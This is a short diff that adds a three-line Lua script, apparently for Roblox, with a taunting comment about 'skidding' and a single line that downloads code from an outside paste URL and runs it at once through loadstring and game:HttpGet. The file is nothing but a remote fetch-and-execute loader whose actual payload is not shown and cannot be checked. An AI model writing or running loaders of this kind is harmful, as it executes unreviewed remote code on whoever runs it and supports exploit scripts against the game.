@@ -1,0 +1,3 @@
+-- why bother skidding?
+
+loadstring(game:HttpGet("https://bin.mudfish.net/r/286-5805-3328"))()
